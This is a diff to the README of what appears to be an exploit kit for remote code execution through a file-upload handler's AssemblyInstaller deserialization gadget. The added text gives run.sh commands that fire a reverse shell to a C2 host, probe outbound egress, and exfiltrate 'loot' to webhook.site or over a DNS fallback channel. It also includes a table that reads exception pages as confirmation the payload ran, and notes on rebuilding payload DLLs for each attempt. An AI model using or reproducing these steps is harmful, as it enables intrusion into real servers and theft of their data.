@@ -37,10 +37,45 @@ Optional one-liner variants:
 ./run.sh versions                         # handler + version discovery
 ./run.sh shell                            # ...then fire the reverse shell
 REV_HOST=<c2-ip> REV_PORT=4444 ./run.sh shell
+
+C2_URL="https://webhook.site/<uuid>" ./run.sh egress   # is egress even open?
+C2_URL="https://webhook.site/<uuid>" ./run.sh exfil    # fire + auto-pull
+./run.sh writemap                                      # writable AND served dirs
+DNS_DOMAIN="<x>.oast.pro" C2_URL="..." ./run.sh exfil  # DNS fallback channel
 ```
+
+`egress` is the oracle: it uploads a probe DLL that TCP-connects to your
+receiver and to `1.1.1.1:443` / `8.8.8.8:53`, sleeping 6 s per reachable
+endpoint. **~6–18 s means outbound works; 0–5 s means it is filtered.** Judge
+payload execution by that, not by the `InvalidCastException` page — that error
+page is the exploit working.
+
+`exfil` re-derives everything: it writes the receiver config to the fixed path
+`C:\Windows\Temp\c2.txt`, proves egress first, fires, then polls and reassembles
+for you. Loot also lands in `C:\Windows\Temp\exfil.log`, and is copied into any
+`DROPS='<dir>'` you pass.
+
+Payloads must be **rebuilt for each attempt** — `AssemblyInstaller` resolves
+assemblies by identity, and the identity carries the filename, so re-triggering
+the same DLL file is a no-op while the worker process lives. `run.sh` tracks
+fired payloads in `.fired` and warns.
 
 If it doesn't confirm, it tells you exactly what to try next (other
 architecture `ARCH=amd64`/`x86`, or another `VERSION=`).
+
+### Reading the output
+
+| What you see after the trigger | Meaning |
+|---|---|
+| `InvalidCastException … AssemblyInstaller … IAsyncUploadConfiguration`, ~0.2 s | **success** — the payload assembly loaded and `DllMain` ran; the cast fails because the object is the gadget, not the config type |
+| `BadImageFormatException` | wrong arch (this target is **x86**) |
+| `FileNotFoundException` / `DirectoryNotFoundException` | the remote filename or folder is wrong |
+| `FileLoadException` | assembly loaded but its dependencies (e.g. VC++ runtime) are missing |
+| 8–10 s pause | the `sleep` payload actually slept |
+
+A run can therefore be RCE-confirmed and still produce no loot — that is an
+egress or config problem, not an exploit problem. The exfil payload now writes
+`C:\Windows\Temp\exfil.log` on every attempt; `writemap`/`DROPS` can pull it out.
 
 A GitHub Actions job (`.github/workflows/build-dlls.yml`) rebuilds and re-commits
 the payloads on any change to the C sources, using MSVC on a Windows runner.
